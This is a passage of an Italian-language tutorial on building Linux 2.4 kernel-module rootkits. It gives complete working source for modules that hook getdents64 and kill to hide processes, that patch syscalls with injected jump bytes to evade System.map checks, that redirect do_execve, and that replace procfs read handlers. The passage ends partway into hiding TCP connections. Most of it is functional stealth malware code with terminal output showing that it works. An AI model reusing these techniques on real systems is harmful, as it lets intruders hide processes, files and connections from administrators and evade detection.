+#define HIDESIG		333 // Il segnale che usiamo per nascondere un processo
+#define UNHIDESIG	666 // Quello che useremo per farlo tornare visibile
+
+long	        (*o_getdents64) (unsigned int fd,
+				 struct linux_dirent64 * dirp,
+				 unsigned int count);
+int		(*o_kill)(int pid, int sig);
+/* Sfrutteremo la sys_kill per impartire ordini al nostro modulo */
+
+int n_atoi(char *str) {
+	int res = 0;
+	int mul = 1;
+	char *ptr;
+	for (ptr = str + strlen(str) - 1; ptr >= str; ptr--)
+	{ if (*ptr < '0' || *ptr > '9')
+		return (-1);
+		res += (*ptr - '0') * mul;
+		mul *= 10;
+	}
+	return (res);
+} 
+/* Una reimplementazione della funzione atoi, ci servira' per capire che
+processo stiamo analizzando */
+
+struct task_struct *get_task(int pid) {
+	struct task_struct *run=current;
+	do {
+		if(run->pid==pid)
+			return run;
+		run=run->next_task;
+	}
+	while(run!=current); 
+		
+	return NULL;
+}
+/* Scorriamo la lista dei processi alla ricerca di quello col pid uguale al
+parametro passato */
+
+
+long
+n_getdents64(unsigned int fd, struct linux_dirent64 *dirp,
+	     unsigned int count)
+{
+    struct linux_dirent64 *dir,*ptr,
+                   *tmp,
+                   *prev = NULL;
+    long             i,rec=0,
+                    ret;
+    struct inode *inode;
+    struct task_struct *name;   
+    ret = (*o_getdents64) (fd, dirp, count);
+    if (ret <= 0)
+	return ret;
+    if ((tmp = (struct linux_dirent64 *) kmalloc(ret, GFP_KERNEL)) == NULL)
+	return ret;
+    copy_from_user(tmp, dirp, ret);
+    ptr= dir = tmp;
+    i = ret;
+    
+    /* Eccoci qui, con questa riga andiamo a scoprire quale inode e' associato
+    al file descriptor che ci e' stato passato.
+    Da current si passa a files, una struttura di supporto, da li' si accede al
+    campo fd che  un array di puntatori a strutture file che indicizziamo col
+    valore del nostro file descriptor. Praticamente cosi' accediamo alla
+    struttura file associata a quel file descriptor. Una struttura file e' la
+    rappresentazione a kernel space di un "file aperto". In sostanza, quando un
+    nostro programma fa` una open ne viene creata una. Da li' accediamo al
+    dentry (directory entry) un'altra struttura di supporto che tra le altre
+    cose contiene il numero dell'inode, proprio quello che stavamo cercando :)
+    */
+    
+    inode = current->files->fd[fd]->f_dentry->d_inode;
+    /* Controlliamo se l'inode e' equivalente a quello di proc */
+    if(inode->i_ino== PROC_ROOT_INO) {
+    while (((unsigned long ) dir) < (((unsigned long) tmp) + i)) {
+        rec=dir->d_reclen;
+        /* Ricordate? I nomi delle directory in proc rappresentavano il numero
+           del processo. Converto in numero il nome della directory con la
+           nostra atoi e poi cerco nella lista se per caso gli e' associato
+           qualche processo. Nel caso ce ne sia uno controllo e se e'
+	   invisibile procedo con l'eliminarlo dall'output.
+	*/
+	if ( ((name=get_task(n_atoi(dir->d_name)))&&
+	((name->flags&PF_INVISIBLE)==PF_INVISIBLE))) {
+	    if (!prev) {
+		ret -= rec;
+		ptr =
+		    (struct linux_dirent64 *) (((unsigned long) dir) +rec);
+	    } else {
+		
+		prev->d_reclen += rec;
+		memset(dir, 0, rec);
+
+	    }
+	} else
+	    prev = dir;
+	dir=(struct linux_dirent64 *)(((unsigned long)dir)+rec);
+    
+    }
+    copy_to_user(dirp,ptr,ret);
+}
+    kfree(tmp);
+    return ret;
+
+}
+
+/* Come vedete nulla di difficile, riconosco i segnali speciali ed agisco di
+conseguenza */
+
+int n_kill(int pid, int sig) {
+	struct task_struct *task=get_task(pid);
+	if(task!=NULL) {
+		switch(sig) {
+			case HIDESIG 	: 	task->flags|=PF_INVISIBLE;
+					       	return 0;
+			case UNHIDESIG	:	task->flags&=~PF_INVISIBLE;
+						return 0;
+			default		:	return o_kill(pid,sig);
+		}
+	}
+	return -1;
+}
+
+int
+init_module(void)
+{
+    o_getdents64 = sys_call_table[SYS_getdents64];
+    o_kill=sys_call_table[SYS_kill];
+    sys_call_table[SYS_getdents64] = n_getdents64;
+    sys_call_table[SYS_kill]=n_kill;
+    EXPORT_NO_SYMBOL;
+    return 0;
+}
+void
+cleanup_module(void)
+{
+    sys_call_table[SYS_getdents64] = o_getdents64;
+    sys_call_table[SYS_kill]=o_kill;
+}
+MODULE_LICENSE("GPL");
+<-X->
+
+Questo che segue e' un piccolo programmino per controllare il nostro modulo.
+Si limita a chiamare la funzione kill coi parametri "maligni":
+
+<-| LKEPD/prochider.c |->
+#include <stdio.h>
+#include <sys/types.h>
+#include <signal.h>
+#include <stdlib.h>
+#define HIDE 333
+#define UNHIDE 666
+
+void usage(char *arg) {
+	fprintf(stderr,"Usage: %s pid command[HIDE | UNHIDE]\n",arg);
+	exit(-1);
+}
+
+int main(int argc,char *argv[]) {
+int sig;
+
+	if(argc<3)
+		usage(argv[0]);
+
+	switch(strcmp(argv[2],"HIDE")) {
+		case 0: sig=HIDE;
+			break;
+		default: sig=UNHIDE;
+	}
+	
+	if((sig=kill(atoi(argv[1]),sig))!=0)
+		fprintf(stderr,
+		"Errore, impossibile effettuare l'operazione richiesta\n");
+	return 0;
+}
+<-X->
+
+Testiamo:
+Vortex:/tmp# insmod prochide.o
+Vortex:/tmp# ps | grep bash
+  545 pts/2    00:00:00 bash
+Vortex:/tmp# ./prochider 545 HIDE
+Vortex:/tmp# ps | grep bash
+Vortex:/tmp# ps | grep ps
+Vortex:/tmp# ./prochider 545 UNHIDE
+Vortex:/tmp# ps | grep bash
+  545 pts/2    00:00:00 bash
+Vortex:/tmp# ps | grep ps
+  2659 pts/2    00:00:00 ps
+Vortex:/tmp#
+
+Come potete vedere funziona perfettamente, e per di piu nasconde automaticamente
+anche tutti i figli di un processo nascosto. (Ricordate? Il processo viene
+copiato dal padre e cosi' eredita anche il nostro PF_INVISIBLE).
+
+
+- PARENTESI SUL DETECTING DI PROCESSI
+
+Un approccio di questo tipo e' notevolmente comodo, pero' non e' del tutto
+"sicuro" in quanto elimina solo alla "vista" il processo, la sua directory in
+/proc continuera' ad essere presente anche se non visibile. Si potrebbe percio'
+creare un programma, una specie di scanner, che provi ad aprire tutte le
+possibili directory in proc. I nomi delle directory sono da "1" a "PID_MAX",
+percio' basterebbe provare ad aprirle tutte in sequenza per scoprire quali sono
+i processi effettivamente attivi sulla macchina. Ovviamente si puo' ovviare
+anche a questo problema, ma anche le tecniche di rilevamento possono essere
+piu' sofisticate, e' un continuare a rincorrersi. Piu' si va a lavorare a basso
+livello piu' si guadagna in occultamento e si diventa sempre piu' difficili da
+individuare, al tempo stesso pero' piu' andiamo a perdere astrazione nel
+funzionamento del kernel piu' aumenta la complessita' dei nostri attacchi e
+meno diventiamo portabili, cosa fondamentale per questo genere di software. E'
+inutile creare attacchi super se poi l'unica macchina dove in pratica
+funzioneranno senza problemi e' la nostra. Comunque sia, vedremo dopo questo
+genere di cose, volevo solo farvi capire che non siete in una botte di ferro :)
+
+
+Note:
+[1] Per una rapida e comoda visione dei sorgenti vi consiglio di andare su
+http://www.iglu.org.il/lxr/ident
+[2] Per ottenere un occultamento ancora piu solido con questo tipo di approccio
+bisognerebbe monitorare in modo analogo tutte le syscall della famiglia *stat.
+Siccome l'implementazione di questi hook e' piuttosto semplice e ripetitiva lo
+lascio come esercizio.
+
+
+SEZIONE III
+===========
+
+- ANCORA SUL DETECTING
+
+Fin qui abbiamo imparato a nascondere file e processi in modo dignitoso, ma
+non abbiamo ancora trovato un modo di nascondere "noi" stessi, ovvero la
+presenza del nostro modulo. Tralasciamo per un attimo il "far sparire" il
+modulo in se stesso, preoccupiamoci intanto di rendere invisibili, o meglio,
+di rendere meno visibili i suoi effetti sul sistema.
+Noi dopotutto andiamo semplicemente a modificare dei puntatori coi nostri hook
+alla sys call table, ma sfortunatamente sono delle modifiche in un posto
+_estremamente_ controllato e dove e' facile risalire ad eventuali modifiche.
+In /boot possiamo trovare un file chiamato System.map . Questo file, creato in
+fase di compilazione del kernel, contiene tutti gli indirizzi dei simboli
+esportati e non, percio' conterra' anche gli indirizzi autentici delle sys
+call:
+
+Vortex:~# grep sys_getdents64 /boot/System.map-2.4.23
+c015cb60 T sys_getdents64
+
+Percio' un semplicissimo confronto degli indirizzi presenti nella sys call
+table con quelli del System.map ci individuerebbe all'istante.
+Bisogna dunque trovare un altro punto dove andare ad agganciarci oppure un
+altro modo di agganciarsi che non modifichi gli indirizzi delle funzioni.
+
+
+- REDIREZIONE DI QUALSIASI FUNZIONE
+
+Con questo paragrafo andremo a lavorare ad un livello un pochettino piu' in
+basso rispetto a prima, niente di complicato comunque. Questa tecnica ha il
+vantaggio di permetterci di intervenire su qualsiasi funzione mantenendo un
+livello di portabilita' estremamente elevato. Chiaramente, se si abusa di
+questo sistema, non dobbiamo aspettarci che tutto vada sempre liscio :)
+
+Un controllo degli indirizzi come ho descritto poco fa puo' essere fastidioso
+a prima vista, ma ad un'analisi piu' approfondita possiamo notare che e'
+incredibilmente stupido: un approccio simile ci puo' dire se viene chiamata la
+funzione all'indirizzo corretto, ma non ci da' alcuna informazione riguardo a
+cosa viene effettivamente eseguito. Se, ad esempio, il codice in memoria della
+syscall venisse sovrascritto da una nostra funzione, il controllo non
+rilveverebbe alcunche' di anomalo nonostante sia stato sostituito l'intero
+codice.
+Chiaramente un lavoro del genere sarebbe piuttosto laborioso, ma ci da'
+un'indicazione sulla via da seguire, ovvero la modifica del comportamento della
+funzione. Pensateci un attimo, per modificare il lavoro svolto da una funzione
+non e' necessario sovrascriverla completamente, basterebbe solo fare in modo
+che le prime istruzioni fossero il "richiamare" una nostra funzione, che si
+occuperebbe di svolgere il lavoro senza ulteriori complicazioni.
+Ad esempio, se la routine originaria fosse questa:
+
+int saluta(void) {
+
+	printf("Ciao\n");
+	printf("Ciao\n");
+	printf("Ciao\n");
+	printf("Ciao\n");
+	exit(0);
+}
+
+e volessimo sostituirla con questa:
+
+int saluta2(void) {
+	
+	printf("Ciao ciao ciao\n");
+	exit(0);
+}
+
+basterebbe fare in modo che "saluta" diventi pressapoco cosi:
+
+int saluta(void) {
+	saluta2();
+	...
+}
+
+Cosi` non si avrebbero nemmeno problemi di dimensioni nel caso in cui la
+funzione "maligna" (saluta2) fosse notevolmente piu` grande di quella benigna.
+I problemi ora sono:
+1) Per sovrascriverla dobbiamo conoscere l'indirizzo della funzione.
+2) Trovare un sistema per "inserire" il codice maligno.
+
+Per il punto 1 la risposta e` presto data, nel caso di una syscall ad esempio
+potremmo prendere direttamente l'indirizzo dalla sys call table, oppure (per
+una qual sorta di ripicca:) dal System.map .
+Per il punto 2 potremmo fare cosi`: creiamo a "mano" delle istruzioni in codice
+macchina che facciano "saltare" l'esecuzione del programma da un'altra parte
+(ovvero direttamente nella nostra funzione) e poi andiamo a sovrascriverle sui
+primi bytes della funzione originaria. Cosi` facendo, quando verra` chiamata
+la funzione "vittima" questa non fara` altro che "saltare" nella nostra e noi
+potremo fare tutto quel che vorremo :)
+Ecco il codice di una prima implementazione di quanto detto:
+
+<-| LKEPD/redir.c |->
+#define __KERNEL__
+#define MODULE
+#ifdef CONFIG_MODVERSIONS
+#include <linux/modversions.h>
+#endif
+
+#include <linux/module.h>
+#include <linux/kernel.h>
+#include <sys/syscall.h>
+#include <string.h>
+
+#define CODESIZE 7
+
+extern void *sys_call_table[];
+unsigned long address;
+
+static char inj_code[CODESIZE]="\xb8\x00\x00\x00\x00\xff\xe0";
+/* 
+   Ecco la riga magica che inseriremo per farci saltare, questi byte
+   significano:
+
+        movl $0,%eax <- Memorizza il valore 0 nel registro eax
+        jmp  *%eax   <- Salta al valore contenuto in eax
+   
+   Nota: ovviamente volendo potremmo usare anche un altro registro per
+         effettuare queste operazioni.
+
+   Praticamente, inserisco un valore arbitrario in un registro (valore che nel
+   nostro caso sara` l'indirizzo della funzione maligna) ora rappresentato da
+   0, e poi "salto" all'indirizzo memorizzato cosi` da modificare il flusso del
+   programma.
+   Per creare questa sequenza (che in realta` sono gli opcodes delle istruzioni
+   coi relativi argomenti) e` sufficiente creare un piccolo programmino che
+   contenga queste istruzioni, compilarlo e poi disassemblare:
+   
+   int main(void) {
+   	asm volatile("movl $0,%eax\n"
+		     "jmp *%eax\n"
+		    );
+	return 0;
+   }
+   
+   Lo compiliamo, poi con gdb lo disassembliamo ed otteniamo:
+   
+   Vortex:~# gcc -ggdb test.c -o test
+   Vortex:~# gdb -f ./test
+   ....
+   ....
+   (gdb) disas main
+   ....
+   ....
+   0x8048344 <main+16>:    mov    $0x0,%eax
+   0x8048349 <main+21>:    jmp    *%eax
+   ....
+   End of assembler dump.
+   (gdb) x/bx main+16 
+   0x8048344 <main+16>:    0xb8
+   (gdb)
+   0x8048345 <main+17>:    0x00
+   (gdb)
+   0x8048346 <main+18>:    0x00
+   (gdb)
+   0x8048347 <main+19>:    0x00
+   (gdb)
+   0x8048348 <main+20>:    0x00
+   (gdb)
+   0x8048349 <main+21>:    0xff
+   (gdb)
+   0x804834a <main+22>:    0xe0
+   (gdb)
+   
+   Ecco fatto :)
+*/
+
+static char backup[CODESIZE];
+
+int n_getdents64(void) {
+	printk("Funzione rediretta\n");
+	return -1;
+}
+
+int init_module(void) {
+
+	EXPORT_NO_SYMBOLS;
+
+	address=(unsigned long)sys_call_table[SYS_getdents64];
+        /* Memorizzo l'indirizzo della syscall */
+	
+	memcpy(backup,(unsigned long*)address,CODESIZE);
+        /* Copio i primi bytes per il ripristino in caso di unload del
+	   modulo */
+	
+	*(unsigned long*)&inj_code[1]=(unsigned long)n_getdents64;
+        /* Scrivo l'indirizzo della nuova funzione nel buffer */
+	
+	memcpy((unsigned long*)address,inj_code,CODESIZE);
+        /* Sovrascrivo il buffer sui primi bytes della funzione originaria */
+	
+	return 0;
+}
+
+void cleanup_module(void) {
+	memcpy((unsigned long*)address,backup,CODESIZE);
+	/* Ripristino i bytes originali */
+}
+<-X->
+
+Compiliamo ed inseriamo, poi
+
+Vortex:~# ls
+Funzione rediretta
+ls: reading directory .: Operation not permitted
+total 0
+Vortex:~# rmmod redir
+Vortex:~# ls
+total 0
+drwxrwxrwt    4 root     root         4096 Mar  4 03:21 ./
+drwxr-xr-x   21 root     root         4096 Mar  3 18:07 ../
+Vortex:~#
+
+Molto bene, ma si puo' fare di meglio... ripensate brevemente a tutti gli hook
+che abbiamo fatto fino ad ora, possono essere tutti schematicamente riassunti
+in questo modo:
+
+- Chiama la funzione originale
+- Modifica l'output
+- Ritorna l'output modificato
+
+Se tenessimo un hook di questo tipo adottando la tecnica appena spiegata
+combineremmo un bel pasticcio, in quanto la "funzione originale" e` proprio
+quella modificata per chiamarne un'altra, percio` finiremmo col richiamare
+noi stessi all'infinito! Dobbiamo dunque trovare un modo di venirne fuori.
+La soluzione (se volete proprio leggerla senza pensarci prima voi) e`
+estremamente semplice, basta applicare la stessa tecnica... all'inverso :)
+Ovvero, dalla nostra funzione maligna ripristiniamo i bytes originali,
+chiamiamo la funzione corretta e perfettamente funzionante, ripristiniamo il
+nostro codice di salto e proseguiamo col consueto filtraggio. Questo sistema
+si puo' applicare a _qualsiasi_ funzione, in forme piu` o meno "aggressive"[1]
+Rivediamo il codice di prima con questa modifica:
+
+<-| LKEPD/redir2.c |->
+#define __KERNEL__
+#define MODULE
+#ifdef CONFIG_MODVERSIONS
+#include <linux/modversions.h>
+#endif
+
+#include <linux/module.h>
+#include <linux/kernel.h>
+#include <linux/dirent.h>
+#include <linux/unistd.h>
+#include <sys/syscall.h>
+#include <string.h>
+
+#define CODESIZE 7
+
+extern void *sys_call_table[];
+unsigned long address;
+
+static char inj_code[CODESIZE]="\xb8\x00\x00\x00\x00\xff\xe0";
+static char backup[CODESIZE];
+
+int (*o_getdents64)(unsigned int fd, struct dirent *dirp, unsigned int count);
+
+int n_getdents64(unsigned int fd, struct dirent *dirp, unsigned int count) {
+	int ret;
+	printk("Funzione rediretta\n");
+	memcpy((unsigned long*)address,backup,CODESIZE);
+	ret=o_getdents64(fd,dirp,count);
+	memcpy((unsigned long*)address,inj_code,CODESIZE);
+	return ret;
+}
+	
+
+int init_module(void) {
+	o_getdents64=sys_call_table[SYS_getdents64];
+	address=(unsigned long)sys_call_table[SYS_getdents64];
+	memcpy(backup,(unsigned long*)address,CODESIZE);
+	*(unsigned long*)&inj_code[1]=(unsigned long)n_getdents64;
+	memcpy((unsigned long*)address,inj_code,CODESIZE);
+	return 0;
+}
+
+void cleanup_module(void) {
+	memcpy((unsigned long*)address,backup,CODESIZE);
+}
+<-X->
+
+Voila' :)
+
+
+Note:
+
+[1] Volendo si puo' modificare una funzione anche nel mezzo del suo codice, ma
+questo e` notevolmente piu` complesso e meno portabile, vedremo qualche esempio
+in seguito.
+
+
+- REDIREZIONE DELLA EXECVE
+
+Ora che abbiamo imparato ad agganciarci a qualsiasi cosa, vediamo subito una
+redirezione semplice semplice che ci permetta di prendere confidenza con la
+tecnica, quella della execve.
+La sys_execve e` quella sys call che si occupa di far eseguire un programma
+quando lo lanciamo dalla nostra shell preferita, una redirezione di questa
+funzione percio` vuol dire essere tecnicamente in grado di far eseguire un
+programma al posto di un altro, tutto a nostro piacimento.
+A parer mio al di la` dell'aspetto puramente "scenico" questa e` una cosa che
+non trova grandi applicazioni, o comunque non riveste un ruolo fondamentale
+come puo' essere quello della getdents64, comunque sia e` indubbio che a volte
+puo' far comodo :)
+Andiamo a vedere come e` fatta la sys_execve:
+
+asmlinkage int sys_execve(struct pt_regs regs)
+{
+       int error;
+       char * filename;
+       filename = getname((char *) regs.ebx);
+       /* Ricava il nome del file che sta per essere eseguito */
+	
+       error = PTR_ERR(filename);
+       if (IS_ERR(filename))
+              goto out;
+       /* Controlla che non ci sia un errore */
+	
+       error = do_execve(filename, (char **)regs.ecx, (char **)regs.edx, &regs);
+       /* Chiama la funzione che effettivamente svolgera` il lavoro */
+
+       /* Da qui sotto in poi non ci interessa */
+
+       if (error == 0)
+              current->ptrace &= ~PT_DTRACE;
+       putname(filename);
+out:
+       return error;
+}
+
+Come potete vedere la funzione prende in ingresso una struttura di tipo pt_regs
+che rappresenta i vari registri, vengono da li` presi il nome del file che sta
+per essere eseguito (filename), la lista degli argomenti (char **)regs.ecx e la
+lista delle variabili d'ambiente (char**)regs.edx, poi il tutto viene passato
+alla do_execve che si occupera` dell'esecuzione vera e propria. Se noi ci
+agganciassimo direttamente alla do_execve avremmo gia` tutti i parametri pronti
+per fare i nostri controlli senza dover richiamare altre funzioni, oltre ad
+essere ancora piu` difficili da individuare che non hookando la syscall stessa.
+L'indirizzo della do_execve oltre ad essere presente in System.map lo e` anche
+in /proc/ksyms [ovvero dove troviamo i simboli esportati] percio` anche
+stavolta non abbiamo che l'imbarazzo della scelta. In piu`, implementeremo il
+modulo in modo che l'inserimento dell'indirizzo della funzione da redirigere
+venga fatto al momento dell'inserimento del modulo nel kernel e non sia piu`
+"fisso", ovvero all'interno del sorgente.
+
+<-| LKEPD/redexecve.c |->
+#define __KERNEL__
+#define MODULE
+#ifdef CONFIG_MODVERSIONS
+#include <linux/modversions.h>
+#endif
+
+#include <linux/module.h>
+#include <linux/kernel.h>
+#include <sys/syscall.h>
+#include <linux/mm.h>
+#define CODESIZE 7
+
+unsigned long address;
+MODULE_PARM(address,"l");
+/* Significa che il modulo avra` un parametro chiamato address di tipo long */
+
+static char inj_code[CODESIZE]="\xb8\x00\x00\x00\x00\xff\xe0";
+static char backup[CODESIZE];
+
+char *redirect="/bin/ps";
+char *redirect_to="/bin/ls";
+/* Quando proveremo ad usare ps al suo posto verra` eseguito ls */
+
+int (*o_do_execve)(char * filename, char ** argv, char ** envp,
+                                                       struct pt_regs * regs);
+
+char *my_strdup(char *);
+
+int n_do_execve(char * filename, char ** argv, char ** envp,
+                                                       struct pt_regs * regs) {
+	int ret;
+	memcpy((unsigned long*)address,backup,CODESIZE);
+	if (strcmp(filename,redirect)==0)
+		ret=o_do_execve(my_strdup(redirect_to),argv,envp,regs);
+	else
+		ret=o_do_execve(filename,argv,envp,regs);
+	memcpy((unsigned long*)address,inj_code,CODESIZE);
+	return ret;
+}
+
+int init_module(void) {
+	EXPORT_NO_SYMBOLS;
+	o_do_execve=(void*)address;
+	memcpy(backup,(unsigned long*)address,CODESIZE);
+	*(unsigned long*)&inj_code[1]=(unsigned long)n_do_execve;
+	memcpy((unsigned long*)address,inj_code,CODESIZE);
+	return 0;
+}
+
+void cleanup_module(void) {
+	memcpy((unsigned long*)address,backup,CODESIZE);
+}
+
+char *my_strdup(char *parameter)
+{
+	char *data=(char*)kmalloc(strlen(parameter)+1,GFP_KERNEL);
+	if(!data)
+		return NULL;
+	memset(data,'\0',strlen(parameter)+1);
+	memcpy(data,parameter,strlen(parameter));
+	return data;
+}
+<-X->
+
+Vortex:~# grep do_execve /proc/ksyms
+c0154d70 do_execve_Rsmp_9c62098f
+Vortex:~# insmod redexecve.o address=0xc0154d70
+Vortex:~# ps
+redexecve.o
+Vortex:~# rmmod redexecve
+Vortex:~# ps
+  PID TTY          TIME CMD
+   1472 pts/2    00:00:00 bash
+   1513 pts/2    00:00:00 ps
+Vortex:~#
+
+
+- CONSIDERAZIONI
+
+Attacchi di questo tipo possono essere una vera e propria spina nel fianco per
+qualcuno che deve cercare tracce della nostra presenza nel sistema dato che
+possono essere messi in atto in qualunque punto del kernel alterandone in
+qualsiasi modo il funzionamento. Chiaramente, piu` ci si va a nascondere
+andando a modificare funzioni sempre piu` a basso livello, piu` la difficolta`
+aumenta e si corre il rischio che un hook che funziona su un determinato
+kernel/versione del kernel non funzioni su un'altra. Tra le altre cose non
+possiamo nemmeno dare per scontata la presenza del System.map e da /proc/ksyms
+potremmo non ottenere le informazioni che ci servono.
+Strada senza uscita? No, tutt'altro, ma dovremo realizzare degli strumenti
+appositi che ci permettano di ottenere le informazioni che ci servono.
+
+
+SEZIONE IV 
+==========
+
+- PROC FILE SYSTEM
+
+Modificare il comportamento delle funzioni non e` l'unica via, esiste anche
+un'altra tecnica che permette di ottenere ottimi risultati mantenendo una
+portabilita' eccezionale: andare ad interagire col proc file system. Se vi
+ricordate, ho accennato al proc file system quando si trattava di capire come
+funzionasse il comando "ps" che "stranamente" utilizzava una getdents64 per
+vedere quali fossero i processi nel sistema.
+Il procfs e` un file system residente completamente in memoria kernel e viene
+"generato on demand". Praticamente, solo nel momento in cui noi proviamo ad
+accedere ad una delle sue entry questa viene "riempita" coi dati.
+Guardate:
+Vortex:/proc# ls /proc/version
+-r--r--r--    1 root     root            0 Mar  4 19:35 /proc/version 
+Vortex:/proc# cat version
+Linux version 2.4.23 (root@Vortex) (gcc version 3.3.3 20040125 (prerelease)
+                                  (Debian)) #1 SMP Thu Mar 4 16:05:48 CET 2004
+Vortex:/proc#
+  
+Il file sembra essere vuoto, ma nel momento in cui ci accediamo i dati vengono
+creati.
+Se riuscissimo percio` a modificare il modo in cui questi dati vengono generati
+(ovvero le funzioni del procfs) potremmo ingannare tutti quei programmi che si
+basano su di esso senza andare a toccare la sys call table.
+Come soluzione e` estremamente pulita, in quanto non si vanno a modificare
+"pezzi" di funzione, ma la si sostituisce per intero modificando solo puntatori
+a funzione.
+Vediamo brevemente la struttura di un'entry del procfs:
+[Direttamente dai sorgenti del kernel di linux]
+
+/*
+ * This is not completely implemented yet. The idea is to
+ * create an in-memory tree (like the actual /proc filesystem
+ * tree) of these proc_dir_entries, so that we can dynamically
+ * add new files to /proc.
+ *
+ * The "next" pointer creates a linked list of one /proc directory,
+ * while parent/subdir create the directory structure (every
+ * /proc file has a parent, but "subdir" is NULL for all
+ * non-directory entries).
+ *
+ * "get_info" is called at "read", while "owner" is used to protect module
+ * from unloading while proc_dir_entry is in use
+ */
+       
+
+typedef int (read_proc_t)(char *page, char **start, off_t off,
+                       int count, int *eof, void *data);
+			  
+typedef int (write_proc_t)(struct file *file, const char *buffer,
+                       unsigned long count, void *data);
+			  
+typedef int (get_info_t)(char *, char **, off_t, int);
+						     
+struct proc_dir_entry {
+        unsigned short low_ino;
+        unsigned short namelen;
+        const char *name;
+        mode_t mode;
+        nlink_t nlink;
+        uid_t uid;
+        gid_t gid;
+        unsigned long size;
+        struct inode_operations * proc_iops;
+        struct file_operations * proc_fops;
+        get_info_t *get_info;
+        struct module *owner;
+        struct proc_dir_entry *next, *parent, *subdir;
+        void *data;
+        read_proc_t *read_proc;
+        write_proc_t *write_proc;
+        atomic_t count;         /* use count */
+        int deleted;            /* delete flag */
+        kdev_t  rdev;
+};
+
+Non e` necessario comprendere il significato di ogni campo di questa struttura,
+vedremo solo quelli che ci interessano.
+La struttura del procfs e` a grandi linee questa:
+
+Il puntatore next serve per accedere agli elementi di una lista i cui nodi
+rappresentano gli altri "file" del procfs presenti nella directory corrente.
+
+Attraverso il puntatore subdir [come potrete intuire dal nome] si accede alla
+sottodirectory. [Contenente a sua volta altre entry ovviamente]
+
+E` percio` possibile scorrerlo tutto partendo dalla radice, come se fosse un fs
+normale.
+Ora che ne abbiamo visto la struttura, focalizziamoci su cosa modificare per
+perseguire i nostri scopi. Quando noi andiamo a leggere il contenuto di un file
+in /proc succede approssimativamente questo:
+  
+- Il kernel rileva il nostro tentativo di lettura del file.
+- Il kernel attiva la funzione che genera il contenuto del file.
+- Noi vediamo l'output della funzione avendo l'impressione che sia sempre stato
+  li`.
+
+Le funzioni relative alla lettura/scrittura indovinate un po' dove sono... si`,
+sono nella struttura proc_dir_entry corrispondente :) Percio` basterebbe:
+
+- Individuare l'entry che ci interessa.
+- Sostituire la funzione che viene chiamata in lettura.
+ 
+ed il gioco sarebbe fatto.
+Vediamo un breve esempio di quanto detto fin'ora, modifichiamo la funzione di
+read del file /proc/version in modo che stampi a video una nostra frase.
+
+<-| LKEPD/version.c |-> 
+#define __KERNEL__
+#define MODULE
+#define LINUX
+#ifdef CONFIG_MODVERSIONS
+#define MODVERSIONS
+#include <linux/modversions.h>
+#endif
+#include <linux/module.h>
+#include <linux/kernel.h>
+#include <linux/dirent.h>
+#include <linux/unistd.h>
+#include <linux/mm.h>
+#include <asm/uaccess.h>
+#include <sys/syscall.h>
+#include <linux/proc_fs.h>
+MODULE_LICENSE("GPL");
+
+int (*o_proc_read_version)(char *page, char **start, off_t off, int count,
+                                                        int *eof, void *data);
+
+
+struct proc_dir_entry *get_version(void)
+{
+/* Cerchiamo nella lista l'entry che ci interessa */
+
+	struct proc_dir_entry *p=proc_root_fs;
+/* Il campo "name" contiene il nome dell'entry */
+	while((p!=NULL) && (strcmp(p->name,"version")))
+		p=p->next;
+	return p;
+} 
+
+
+static int proc_calc_metrics(char *page, char **start, off_t off,
+                           int count, int *eof, int len)
+{
+/* Direttamente dai sorgenti del kernel, questa funzione serve per
+   "aggiustare" alcuni valori nel caso ce ne fosse bisogno */
+         if (len <= off+count) *eof = 1;
+         *start = page + off;
+         len -= off;
+         if (len>count) len = count;
+         if (len<0) len = 0;
+         return len;
+}
+
+int n_proc_read_version(char *page, char **start, off_t off, int count,
+                                                         int *eof, void *data)
+{
+	int len;
+	/* Scriviamo la nostra frase nel buffer che sara` poi visualizzato */
+	strcpy(page,"We are evil ~;)\n");
+	len=strlen(page);
+	return proc_calc_metrics(page, start, off, count, eof, len);
+	
+}
+
+int init_module(void) {
+ 	EXPORT_NO_SYMBOLS;
+	struct proc_dir_entry *version=get_version();
+	
+	/* Associo il puntatore della funzione di lettura al mio puntatore */
+	o_proc_read_version=version->read_proc;
+	/* Sostituisco il puntatore dell'entry in proc con la mia funzione */
+	version->read_proc=n_proc_read_version;
+	return 0;
+}
+
+void cleanup_module(void) 
+{
+	/* Ripristino la funzione originaria */
+	(get_version())->read_proc=o_proc_read_version;
+}
+<-X->
+
+Vortex:~# insmod version.o
+Vortex:~# cat /proc/version
+We are evil ~;)
+Vortex:~# rmmod version
+Vortex:~# cat /proc/version
+Linux version 2.4.23 (root@Vortex) (gcc version 3.3.3 20040125 (prerelease)
+                                  (Debian)) #1 SMP Thu Mar 4 16:05:48 CET 2004
+Vortex:~#
+
+
+- COME OCCULTARE LE CONNESSIONI
+
+Ora che abbiamo qualche conoscenza in piu` vediamo di utilizzarla in modo
+proficuo. Netstat va a leggere le informazioni riguardo alle connessioni
+proprio in /proc, e piu` precisamente in /proc/net, come si puo' facilmente
+verificare attraverso strace. Questo vuol dire che possiamo nascondere
+qualsiasi connessione solo lavorando col procfs senza ricorrere a tecniche
+primitive come l'hook della sys_write o della sys_read.
+Nell'implementazione che andro` a mostrarvi e` implementato solamente
+l'occultamento delle connessioni tcp, ma la tecnica e` perfettamente valida
+per nascondere quelle di qualsiasi altro tipo.
+Come avrete visto, le connessioni tcp si trovano nel file /proc/net/tcp,
+vediamone il formato:
+   
+Vortex:~# cat /proc/net/tcp
+  sl  local_address rem_address   st tx_queue rx_queue tr tm->when retrnsmt
+   0: 00000000:1A0B 00000000:0000 0A 00000000:00000000 00:00000000 00000000
+   1: 00000000:000F 00000000:0000 0A 00000000:00000000 00:00000000 00000000
+  sl  uid  timeout inode
+   0:   0        0 2587 1 d43dc800 300 0 0 2 -1
+   1:   0        0 2601 1 ce328400 300 0 0 2 -1
+	
+Vortex:~#
+
+Ci sono due entry numerate 0 ed 1 [i valori identificativi all'estrema
+sinistra], percio` le connessioni vengono numerate da 0 ad n-1, poi abbiamo
+l'indirizzo locale, la porta locale, indirizzo/porta remote, lo stato ed altre
+informazioni. Come e` facile intuire dai valori delle porte locali le
+informazioni sono in esadecimale.
+Controlliamo con netstat:
+Vortex:~# netstat -an
+...
+tcp        0      0 0.0.0.0:6667            0.0.0.0:*               LISTEN
+tcp        0      0 0.0.0.0:15              0.0.0.0:*               LISTEN
+...
+Vortex:~#
+
+ed effettivamente coincidono i valori: 000F -> 15 e 1A0B -> 6667
+
+Mettiamo di voler nascondere tutte le connessioni da/alla porta 6667, non
+dovremo fare altro che analizzare ogni riga che dovrebbe essere scritta in
+/proc/net/tcp e controllare la presenza della sottostringa :1A0B : se la
